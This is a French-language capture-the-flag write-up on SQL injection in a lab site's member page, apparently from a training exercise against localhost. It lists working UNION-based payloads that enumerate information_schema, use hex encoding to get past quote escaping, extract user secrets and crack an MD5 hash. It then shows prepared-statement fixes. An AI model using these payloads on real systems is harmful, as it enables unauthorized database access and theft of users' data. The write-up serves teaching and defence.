# SQL Injection - Members Page

## La faille

La page accepte un paramètre `id` via GET sans validation :

```
http://localhost:8080/index.php?page=member&id=1&Submit=Submit
```

Le serveur exécute probablement une requête SQL non sécurisée :

```sql
SELECT first_name, surname FROM users WHERE id = '$id'
```

**Problème** : Le paramètre `id` est directement inséré dans la requête SQL sans échappement ni préparation, permettant d'injecter du code SQL arbitraire.

## Reconnaissance

### 1. Tester la présence de l'injection

Essayer différentes valeurs pour voir si le serveur est vulnérable :

```
?id=1 OR 1=1        -- Retourne tous les résultats
?id=1' OR '1'='1    -- Test avec des quotes
?id=1 UNION SELECT 1,2    -- Test UNION
```

### 2. Déterminer le nombre de colonnes

La requête originale semble avoir 2 colonnes (first_name, surname). On utilise `UNION SELECT` :

```
?id=1 UNION SELECT 1,2
?id=0 UNION SELECT 'test1','test2'
```

### 3. Énumérer les tables de la base

Avec `information_schema`, on peut lister toutes les tables :

```
?id=0 UNION SELECT table_name, table_type FROM information_schema.tables
```

**Résultat important** : On trouve les tables `users`, `db_default`, `list_images`, `guestbook`, `vote_dbs`

### 4. Énumérer les colonnes d'une table

Pour connaître la structure de la table `users` :

```
?id=0 UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name=0x7573657273
```

**Important** : Le serveur échappe les guillemets simples. On utilise donc l'**encodage hexadécimal** :
- `users` en hexa = `0x7573657273`
- Pas besoin de guillemets avec cette méthode

**Colonnes de la table `users`** :
- `user_id` (int)
- `first_name` (varchar)
- `last_name` (varchar)
- `town` (varchar)
- `country` (varchar)
- `planet` (varchar)
- `Commentaire` (varchar)
- `countersign` (varchar)


### 5. Extraire les données sensibles

Maintenant qu'on connaît la structure, on peut extraire les données :

```
?id=0 UNION SELECT first_name, last_name FROM users
?id=0 UNION SELECT Commentaire, countersign FROM users
?id=0 UNION SELECT Commentaire, countersign FROM users WHERE first_name=0x466c6167
```

Le flag se trouve dans les colonnes `Commentaire` ou `countersign` de l'utilisateur avec `first_name='Flag'`.

## Solution complète

```
1. Lister les tables :
   ?id=0 UNION SELECT table_name, table_type FROM information_schema.tables

2. Lister les colonnes de 'users' (avec encodage hexa) :
   ?id=0 UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name=0x7573657273

3. Extraire toutes les données (avec encodage hexa pour 'Flag') :
   ?id=0 UNION SELECT Commentaire, countersign FROM users WHERE first_name=0x466c6167
```

**Note** : Encodages hexadécimaux utilisés :
- `users` = `0x7573657273`
- `Flag` = `0x466c6167`

### Obtenir le flag final

**Résultat obtenu** :
ID: 0 UNION SELECT Commentaire, countersign FROM users WHERE first_name=0x466c6167 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

Le hash `5ff9d0165b4f92b14994e5c685cdce28` est un hash MD5 qu'il faut décrypter avec https://www.dcode.fr/md5-hash

On obtient `FortyTwo` qu'on lower case puis re-encrypte en SHA-256 pour obtenir le flag final : https://www.dcode.fr/sha256-hash

## Bonne pratique

### ❌ Code vulnérable

```php
<?php
$id = $_GET['id'];
$query = "SELECT first_name, surname FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);
?>
```

**Problème** : Concaténation directe de l'entrée utilisateur dans la requête SQL.

### ✅ Solution sécurisée

**Utiliser des requêtes préparées (Prepared Statements)** :

```php
<?php
$id = $_GET['id'];

// Requête préparée avec PDO
$stmt = $pdo->prepare("SELECT first_name, surname FROM users WHERE id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
$result = $stmt->fetch();

// OU avec MySQLi
$stmt = $mysqli->prepare("SELECT first_name, surname FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
?>
```

**Avantages** :
- Les paramètres sont automatiquement échappés
- Impossible d'injecter du code SQL
- Protection native contre les injections

### Protections supplémentaires

1. **Validation des entrées** : Vérifier le type et le format des données
   ```php
   if (!is_numeric($id)) die("Invalid ID");
   ```

2. **Principe du moindre privilège** : L'utilisateur SQL de l'application ne doit avoir que les permissions nécessaires (pas d'accès à `information_schema` si non requis)

3. **WAF (Web Application Firewall)** : Filtrer les requêtes suspectes

4. **Limiter les messages d'erreur** : Ne pas afficher les erreurs SQL en production

## Impact de la vulnérabilité

- **Lecture de données sensibles** : Accès à tous les utilisateurs, mots de passe, etc.
- **Modification de données** : `UPDATE`, `DELETE` via injection
- **Exécution de commandes** : Possibilité d'utiliser `LOAD_FILE()`, `INTO OUTFILE`
- **Élévation de privilèges** : Lecture de tables admin, modification de permissions
